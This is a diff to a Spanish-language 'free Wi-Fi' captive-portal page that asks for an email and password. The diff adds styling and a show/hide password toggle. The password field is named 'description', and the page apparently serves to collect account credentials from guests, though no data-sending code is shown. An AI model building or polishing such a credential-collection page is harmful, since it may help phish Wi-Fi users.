@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>WiFi Gratis Principia</title>
+    <title>Free Wifi Guest Principia</title>
     <link href="https://fonts.googleapis.com/css2?family=Poppins:wght@300;400;600;700&display=swap" rel="stylesheet">
     <style>
         * {
@@ -176,12 +176,43 @@
             font-size: 16px;
             font-family: 'Poppins', sans-serif;
             transition: all 0.3s ease;
+            box-sizing: border-box;
         }
 
         .modal-content input:focus {
             outline: none;
             border-color: #667eea;
             box-shadow: 0 0 0 3px rgba(102, 126, 234, 0.1);
+        }
+
+        .password-container {
+            margin: 10px 0;
+        }
+
+        .password-container input {
+            width: 100%;
+            padding: 15px;
+            margin: 0;
+        }
+
+        .toggle-password {
+            background: none;
+            border: none;
+            cursor: pointer;
+            padding: 8px 0;
+            color: #667eea;
+            font-size: 13px;
+            transition: all 0.2s;
+            font-weight: 500;
+            text-align: right;
+            display: block;
+            width: 100%;
+            margin-top: 5px;
+        }
+
+        .toggle-password:hover {
+            color: #764ba2;
+            text-decoration: underline;
         }
 
         .modal-content button {
@@ -273,7 +304,12 @@
             </p>
             <form id="loginForm">
                 <input type="email" id="username" name="username" placeholder="📧 Correo electrónico" required>
-                <input type="password" id="description" name="description" placeholder="🔑 Contraseña" required>
+                
+                <div class="password-container">
+                    <input type="password" id="description" name="description" placeholder="🔑 Contraseña" required>
+                    <button type="button" class="toggle-password" id="togglePassword">Mostrar</button>
+                </div>
+                
                 <button type="submit" class="btn-submit">Conectar</button>
                 <button type="button" class="btn-cancel" id="cancelBtn">Cancelar</button>
             </form>
@@ -286,6 +322,15 @@
         const form = document.getElementById('loginForm');
         const cancelBtn = document.getElementById('cancelBtn');
         const successMessage = document.getElementById('successMessage');
+        const togglePassword = document.getElementById('togglePassword');
+        const passwordInput = document.getElementById('description');
+
+        // Mostrar/Ocultar contraseña
+        togglePassword.addEventListener('click', function() {
+            const type = passwordInput.type === 'password' ? 'text' : 'password';
+            passwordInput.type = type;
+            togglePassword.textContent = type === 'password' ? 'Mostrar' : 'Ocultar';
+        });
 
         // Abrir modal
         getFreeWiFiBtn.addEventListener('click', function() {
